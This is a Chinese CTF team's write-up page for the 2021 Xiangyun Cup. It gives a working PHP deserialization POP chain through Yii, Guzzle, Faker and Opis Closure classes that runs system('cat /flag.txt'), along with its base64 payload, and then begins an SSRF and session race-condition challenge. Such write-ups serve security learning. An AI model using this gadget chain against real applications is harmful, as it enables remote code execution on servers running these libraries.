<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>2021第二届祥云杯WP - n03tAck</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="n03tAck"><meta name="msapplication-TileImage" content="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/E595997D44EF7013BFD08323A4506527.png"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="n03tAck"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="2021第二届祥云杯WP"><meta property="og:type" content="blog"><meta property="og:title" content="n03tAck"><meta property="og:url" content="https://wp.n03tack.top/"><meta property="og:site_name" content="n03tAck"><meta property="og:description" content="2021第二届祥云杯WP"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image.png"><meta property="og:image" content="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image_1.png"><meta property="og:image" content="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image_2.png"><meta property="og:image" content="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image_3.png"><meta property="og:image" content="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image_4.png"><meta property="og:image" content="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image_5.png"><meta property="og:image" content="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image_6.png"><meta property="og:image" content="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image_7.png"><meta property="og:image" content="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image_8.png"><meta property="og:image" content="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image_9.png"><meta property="og:image" content="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image_10.png"><meta property="og:image" content="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image_11.png"><meta property="og:image" content="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image_12.png"><meta property="og:image" content="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image_13.png"><meta property="og:image" content="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image-20210822004710291.png"><meta property="og:image" content="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image-20210822005343072.png"><meta property="og:image" content="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image-20210822011142791.png"><meta property="og:image" content="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image-20210822011411222.png"><meta property="og:image" content="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image-20210822011616679.png"><meta property="og:image" content="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image-20210822011809006.png"><meta property="og:image" content="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image-20210822011841331.png"><meta property="og:image" content="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image-20210822011951648.png"><meta property="og:image" content="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image-20210822012322550.png"><meta property="og:image" content="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image-20210822012616086.png"><meta property="og:image" content="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image-20210822014417948.png"><meta property="og:image" content="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image-20210822014602111.png"><meta property="og:image" content="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image-20210822014700548.png"><meta property="og:image" content="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image-20210822014852340.png"><meta property="og:image" content="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image-20210822202006427.png"><meta property="og:image" content="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image-20210822202102574.png"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/Misc/1.png"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/Misc/2.png"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/Misc/3.png"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/Misc/4.png"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/Misc/5.png"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/Misc/6.png"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/Misc/clipboard_20210822_100928.png"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/Misc/clipboard_20210822_100957.png"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/Misc/clipboard_20210822_101149.png"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/Misc/clipboard_20210822_101245.png"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/Misc/clipboard_20210822_101338.png"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/Misc/clipboard_20210822_101419.png"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/Misc/clipboard_20210822_101513.png"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/Misc/clipboard_20210822_101540.png"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/Misc/clipboard_20210822_101608.png"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/Misc/clipboard_20210822_101624.png"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/Misc/clipboard_20210822_101753.png"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/Misc/clipboard_20210822_101824.png"><meta property="og:image" content="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/Crypto/%40YL_3YQ4O9%40~%7BXHNUVGL%40P8.png"><meta property="og:image" content="https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/Misc/clipboard_20210822_101918.png"><meta property="og:image" content="https://i.loli.net/2021/08/23/2npwktZRCoTylqj.png"><meta property="og:image" content="https://i.loli.net/2021/08/23/O1tNRpmY9PWSarh.png"><meta property="article:published_time" content="2021-08-23T04:00:00.000Z"><meta property="article:modified_time" content="2021-08-24T04:39:57.938Z"><meta property="article:author" content="n03tAck"><meta property="article:tag" content="2021第二届祥云杯WP"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://wp.n03tack.top/posts/62454/"},"headline":"n03tAck","image":["https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image.png","https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image_1.png","https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image_2.png","https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image_3.png","https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image_4.png","https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image_5.png","https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image_6.png","https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image_7.png","https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image_8.png","https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image_9.png","https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image_10.png","https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image_11.png","https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image_12.png","https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image_13.png","https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image-20210822004710291.png","https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image-20210822005343072.png","https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image-20210822011142791.png","https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image-20210822011411222.png","https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image-20210822011616679.png","https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image-20210822011809006.png","https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image-20210822011841331.png","https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image-20210822011951648.png","https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image-20210822012322550.png","https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image-20210822012616086.png","https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image-20210822014417948.png","https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image-20210822014602111.png","https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image-20210822014700548.png","https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image-20210822014852340.png","https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image-20210822202006427.png","https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image-20210822202102574.png","https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/Misc/1.png","https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/Misc/2.png","https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/Misc/3.png","https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/Misc/4.png","https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/Misc/5.png","https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/Misc/6.png","https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/Misc/clipboard_20210822_100928.png","https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/Misc/clipboard_20210822_100957.png","https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/Misc/clipboard_20210822_101149.png","https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/Misc/clipboard_20210822_101245.png","https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/Misc/clipboard_20210822_101338.png","https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/Misc/clipboard_20210822_101419.png","https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/Misc/clipboard_20210822_101513.png","https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/Misc/clipboard_20210822_101540.png","https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/Misc/clipboard_20210822_101608.png","https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/Misc/clipboard_20210822_101624.png","https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/Misc/clipboard_20210822_101753.png","https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/Misc/clipboard_20210822_101824.png","https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/Crypto/%40YL_3YQ4O9%40~%7BXHNUVGL%40P8.png","https://n03tack-wp-1302856486.cos.ap-nanjing.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/Misc/clipboard_20210822_101918.png","https://i.loli.net/2021/08/23/2npwktZRCoTylqj.png","https://i.loli.net/2021/08/23/O1tNRpmY9PWSarh.png"],"datePublished":"2021-08-23T04:00:00.000Z","dateModified":"2021-08-24T04:39:57.938Z","author":{"@type":"Person","name":"n03tAck"},"description":"2021第二届祥云杯WP"}</script><link rel="canonical" href="https://wp.n03tack.top/posts/62454/"><link rel="icon" href="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/E595997D44EF7013BFD08323A4506527.png"><meta name="referrer" content="no-referrer-when-downgrade"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/5.12.0/css/all.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/highlight.js/9.12.0/styles/vs2015.min.css"><link rel="stylesheet" href="https://fonts.loli.net/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/5.12.0/css/all.min.css"><link rel="stylesheet" href="https://fonts.loli.net/css?family=Ubuntu:400,600|Source+Code+Pro|Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Microsoft YaHei:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&amp;amp;subset=latin,latin-ext|Inconsolata|Itim|Lobster.css"><script src="https://cdnjs.loli.net/ajax/libs/jquery/3.3.1/jquery.min.js"></script><script src="/js/globalUtils.js"></script><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><!--!--><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.7.0/css/justifiedGallery.min.css"><!--!--><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/pace/1.0.2/pace.min.js"></script><meta name="generator" content="Hexo 5.4.0"></head><body class="is-3-column has-navbar-fixed-top"><nav class="navbar navbar-main is-fixed-top"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/E595997D44EF7013BFD08323A4506527.png" alt="n03tAck" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">首页</a><a class="navbar-item" href="/archives">归档</a><a class="navbar-item" href="/categories">分类</a><a class="navbar-item" href="/tags">标签</a><a class="navbar-item" href="/about">关于</a><a class="navbar-item" href="/friend">战队成员</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Join Gitter" href="https://github.com/dota-st"><i class="fab fa-gitter"></i></a><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/dota-st"><i class="fab fa-github"></i></a><a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a><a class="navbar-item" id="night-nav" title="Night Mode" href="javascript:;"><i class="fas fa-moon" id="night-icon"></i></a></div></div></div></nav><script type="text/javascript" src="/js/theme-setting.js"></script><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-9-widescreen"><!--!--><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2021-08-23  <a class="commentCountImg" href="/posts/62454/#comment-container"><span class="display-none-class">/posts/62454/</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="7ec589a12dc998fdc18b7643561369b1">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>1 小时  <i class="fas fa-pencil-alt"> </i>10.3 k</span><span class="level-item" id="busuanzi_container_page_pv"><span id="busuanzi_value_page_pv">0</span>次访问</span></div></div><h1 class="title is-3 is-size-4-mobile">2021第二届祥云杯WP</h1><div class="content"><blockquote>
<p>2021第二届祥云杯WP</p>
<span id="more"></span>
<p>n03tAck战队成员为各个大学的学生，部分战队成员不可能只以n03tAck身份参赛，所以成员作为自身学校的正常组队行为与n03tAck无任何关系，此WP由赛后各个成员汇集而成。</p>
</blockquote>
<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="ezyii"><a href="#ezyii" class="headerlink" title="ezyii"></a>ezyii</h2><p><strong>考点：yii反序列化链子</strong></p>
<p>相关利用的类都发出来了，感觉不像CMS的审计，更像是POP链的构造。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Codeception</span>\<span class="title">Extension</span>&#123;</span><br><span class="line">  <span class="title">use</span> <span class="title">Faker</span>\<span class="title">DefaultGenerator</span>;</span><br><span class="line">  <span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Psr7</span>\<span class="title">AppendStream</span>;</span><br><span class="line">  <span class="class"><span class="keyword">class</span>  <span class="title">RunProcess</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$output</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$processes</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;processes[]=<span class="keyword">new</span> DefaultGenerator(<span class="keyword">new</span> AppendStream());</span><br><span class="line">      <span class="keyword">$this</span>-&gt;output=<span class="keyword">new</span> DefaultGenerator(<span class="string">&#x27;atao&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> RunProcess()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">  <span class="title">class</span> <span class="title">DefaultGenerator</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="title">protected</span> $<span class="title">default</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$default</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;default = <span class="variable">$default</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">GuzzleHttp</span>\<span class="title">Psr7</span>&#123;</span><br><span class="line">  <span class="title">use</span> <span class="title">Faker</span>\<span class="title">DefaultGenerator</span>;</span><br><span class="line">  <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">AppendStream</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$streams</span> = [];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$seekable</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;streams[]=<span class="keyword">new</span> CachingStream();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">CachingStream</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$remoteStream</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;remoteStream=<span class="keyword">new</span> DefaultGenerator(<span class="literal">false</span>);</span><br><span class="line">      <span class="keyword">$this</span>-&gt;stream=<span class="keyword">new</span>  PumpStream();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">PumpStream</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$size</span>=-<span class="number">10</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$buffer</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;buffer=<span class="keyword">new</span> DefaultGenerator(<span class="string">&#x27;j&#x27;</span>);</span><br><span class="line">      <span class="keyword">include</span>(<span class="string">&quot;closure/autoload.php&quot;</span>);</span><br><span class="line">      <span class="variable">$a</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;system(<span class="string">&#x27;cat /flag.txt&#x27;</span>);phpinfo();  &#125;;</span><br><span class="line">      <span class="variable">$a</span> = \Opis\<span class="built_in">Closure</span>\serialize(<span class="variable">$a</span>);</span><br><span class="line">      <span class="variable">$b</span> = unserialize(<span class="variable">$a</span>);</span><br><span class="line">      <span class="keyword">$this</span>-&gt;source=<span class="variable">$b</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload:TzozMjoiQ29kZWNlcHRpb25cRXh0ZW5zaW9uXFJ1blByb2Nlc3MiOjI6e3M6OToiACoAb3V0cHV0IjtPOjIyOiJGYWtlclxEZWZhdWx0R2VuZXJhdG9yIjoxOntzOjEwOiIAKgBkZWZhdWx0IjtzOjQ6ImF0YW8iO31zOjQzOiIAQ29kZWNlcHRpb25cRXh0ZW5zaW9uXFJ1blByb2Nlc3MAcHJvY2Vzc2VzIjthOjE6e2k6MDtPOjIyOiJGYWtlclxEZWZhdWx0R2VuZXJhdG9yIjoxOntzOjEwOiIAKgBkZWZhdWx0IjtPOjI4OiJHdXp6bGVIdHRwXFBzcjdcQXBwZW5kU3RyZWFtIjoyOntzOjM3OiIAR3V6emxlSHR0cFxQc3I3XEFwcGVuZFN0cmVhbQBzdHJlYW1zIjthOjE6e2k6MDtPOjI5OiJHdXp6bGVIdHRwXFBzcjdcQ2FjaGluZ1N0cmVhbSI6Mjp7czo0MzoiAEd1enpsZUh0dHBcUHNyN1xDYWNoaW5nU3RyZWFtAHJlbW90ZVN0cmVhbSI7TzoyMjoiRmFrZXJcRGVmYXVsdEdlbmVyYXRvciI6MTp7czoxMDoiACoAZGVmYXVsdCI7YjowO31zOjY6InN0cmVhbSI7TzoyNjoiR3V6emxlSHR0cFxQc3I3XFB1bXBTdHJlYW0iOjM6e3M6MzQ6IgBHdXp6bGVIdHRwXFBzcjdcUHVtcFN0cmVhbQBzb3VyY2UiO0M6MzI6Ik9waXNcQ2xvc3VyZVxTZXJpYWxpemFibGVDbG9zdXJlIjoyMDQ6e2E6NTp7czozOiJ1c2UiO2E6MDp7fXM6ODoiZnVuY3Rpb24iO3M6NDk6ImZ1bmN0aW9uKCl7XHN5c3RlbSgnY2F0IC9mbGFnLnR4dCcpO1xwaHBpbmZvKCk7CX0iO3M6NToic2NvcGUiO3M6MjY6Ikd1enpsZUh0dHBcUHNyN1xQdW1wU3RyZWFtIjtzOjQ6InRoaXMiO047czo0OiJzZWxmIjtzOjMyOiIwMDAwMDAwMDA5MTZlM2VmMDAwMDAwMDA2NmFhYWNiYSI7fX1zOjMyOiIAR3V6emxlSHR0cFxQc3I3XFB1bXBTdHJlYW0Ac2l6ZSI7aTotMTA7czozNDoiAEd1enpsZUh0dHBcUHNyN1xQdW1wU3RyZWFtAGJ1ZmZlciI7TzoyMjoiRmFrZXJcRGVmYXVsdEdlbmVyYXRvciI6MTp7czoxMDoiACoAZGVmYXVsdCI7czoxOiJqIjt9fX19czozODoiAEd1enpsZUh0dHBcUHNyN1xBcHBlbmRTdHJlYW0Ac2Vla2FibGUiO2I6MTt9fX19</span></span><br></pre></td></tr></table></figure>


<p><img src="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image.png"></p>
<p>flag{bc862289-85e9-48d8-9dd5-fc27162566ff}</p>
<h2 id="安全检测"><a href="#安全检测" class="headerlink" title="安全检测"></a>安全检测</h2><p><strong>考点：SSRF、session条件竞争</strong></p>
<p>随意用户名都可以登陆，接着是SSRF的内容，通过访问<code>http://127.0.0.1/admin/</code>，获得<code>include123.php</code>文件</p>
<p><img src="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image_1.png"></p>
<p>接着访问<code>http://127.0.0.1/admin/include123.php</code>，获取源码</p>
<p><img src="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%A5%A5%E4%BA%91%E6%9D%AF/web/image_2.png"></p>
<p>根据过滤了内容， 可以知道是session条件竞争</p>
